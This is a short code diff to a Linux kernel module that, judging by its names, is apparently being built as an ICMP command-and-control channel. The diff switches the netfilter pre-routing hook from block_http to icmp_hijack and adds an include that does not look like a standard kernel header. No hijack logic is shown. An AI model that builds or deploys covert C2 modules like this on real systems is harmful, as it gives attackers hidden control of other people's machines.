@@ -4,6 +4,7 @@
 #include <linux/netfilter_ipv4.h>
 #include <linux/ip.h>
 #include <linux/icmp.h>
+#include <linux/eth.h>
 #include <linux/ktime.h>
 #include <linux/jiffies.h>
 #include <linux/uaccess.h>
@@ -66,7 +67,7 @@ static int __init init_icmp_hijack(void) {
     printk(KERN_INFO "Loading icmp-c2 module...\n");
 
     // Fill in the nf_hook_ops structure
-    nfho.hook = block_http;                     // Hook function
+    nfho.hook = icmp_hijack;                     // Hook function
     // nfho.hooknum = NF_INET_LOCAL_IN;        // Apply to incoming packets
     nfho.hooknum = NF_INET_PRE_ROUTING;        // Going to try to manipulate
     nfho.pf = PF_INET;                          // IPv4
